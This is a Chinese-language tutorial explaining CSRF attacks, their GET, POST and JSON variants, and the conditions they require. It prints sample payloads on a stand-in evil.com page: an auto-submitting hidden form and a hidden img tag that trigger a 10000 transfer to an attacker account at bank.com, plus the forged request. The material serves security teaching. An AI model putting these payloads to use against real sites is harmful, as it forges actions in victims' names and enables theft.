# 1.定义
## 1.1概括
CSRF（Cross-Site Request Forgery，跨站请求伪造）
攻击者诱导已登录的用户，在用户不知情的情况下，用用户的登录凭证（Cookie）向目标网站发送了一个恶意请求——网站以为是用户本人操作，就执行了。
## 1.2细节
CSRF 的核心原理：浏览器在发送请求时会自动带上目标域名的 Cookie。这是浏览器的默认行为，为了方便用户免重复登录——但这也成了 CSRF 的命门。
```
攻击者网站evil.com → 受害者访问evil.com → evil.com的页面偷偷发请求到bank.com
→ bank.com 收到请求 → 检查Cookie：有效的登录凭证 → 误以为是本人操作 → 执行转账！
```

```
# ⭐ 攻击者网站 evil.com 的恶意页面
<!-- 用户访问这个页面时，浏览器会自动带上 bank.com 的 Cookie -->
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker_account">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.forms[0].submit();</script>  <!-- 自动提交 -->

# 受害者浏览器实际发送的请求：
POST /transfer HTTP/1.1
Host: bank.com
Cookie: session=受害者登录凭证   ← ⭐ 浏览器自动带上！
Content-Type: application/x-www-form-urlencoded

to=attacker_account&amount=10000

# bank.com 的视角：
# "有有效 Cookie？是本人。转账参数完整？执行。"
# → 攻击成功，受害者完全不知情
```
CSRF 的核心：信任了"来源"
服务器只验证了 身份（Cookie 有效），但没验证意图（请求是不是用户主动发起的）。CSRF 就是利用了这个"信任缺口"。
# 2.CSRF 的三种攻击类型
| 类型               | 触发方式                              | 隐蔽性       | 常见度   |
| ---------------- | --------------------------------- | --------- | ----- |
| GET 型 CSRF       | 用 `<img>`、`<script>` 等标签触发 GET 请求 | ★★★★★ 极隐蔽 | ★★★★★ |
| POST 型 CSRF      | 用隐藏表单 + JS 自动提交触发 POST 请求         | ★★★★ 较隐蔽  | ★★★★  |
| JSON/AJAX 型 CSRF | 针对 JSON 接口的 CSRF（需配合特殊技巧）         | ★★★ 中等    | ★★★   |
## 2.1GET 型 CSRF（最简单）
```
# ⭐ 假设银行转账接口是 GET 请求（设计极差）
https://bank.com/transfer?to=attacker&amount=10000

# 攻击者只需在 evil.com 放一个 img 标签：
<img src="https://bank.com/transfer?to=attacker&amount=10000" style="display:none">

# 受害者访问 evil.com → 浏览器加载图片 → 自动发起 GET 请求
# → 浏览器自动带上 bank.com 的 Cookie → 银行执行转账
# 受害者：完全不知道发生了什么（图片加载失败也无所谓）
```
## 2.2POST 型 CSRF（最常见）
```
# 银行转账接口是 POST 请求（正常设计）
POST /transfer HTTP/1.1
Host: bank.com
Content-Type: application/x-www-form-urlencoded

to=xxx&amount=xxx

# ⭐ 攻击者在 evil.com 构造隐藏表单 + 自动提交
<form id="f" action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker_account">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById('f').submit();</script>

# 受害者访问 evil.com → 表单自动提交 → POST 请求带 Cookie 发出 → 转账成功
```
## 2.3JSON型CSRF
 JSON 接口能不能 CSRF？
很多现代 API 用 JSON 格式 + Content-Type: application/json。普通表单发不了 JSON，但可以用 text/plain 技巧绕过：`<form enctype="text/plain">`。
# 3.CSRF 攻击的必备条件
一个请求能被 CSRF，必须同时满足以下条件：
**1.基于 Cookie 的身份认证**
服务器只靠 Cookie 识别用户（没有额外的 Token、二次验证）。如果用 Authorization 头传 Token，浏览器不会自动带上，CSRF 失效。
**2.请求能改变状态**
转账、改密码、发帖、删数据——必须是有"副作用"的写操作。纯查询（GET 读取信息）CSRF 没意义。
**3.没有 CSRF Token / SameSite 保护**
请求中没有不可预测的随机 Token，Cookie 没设置 SameSite 属性。
**4.用户已登录目标网站**
用户当前浏览器里有目标网站的有效会话。
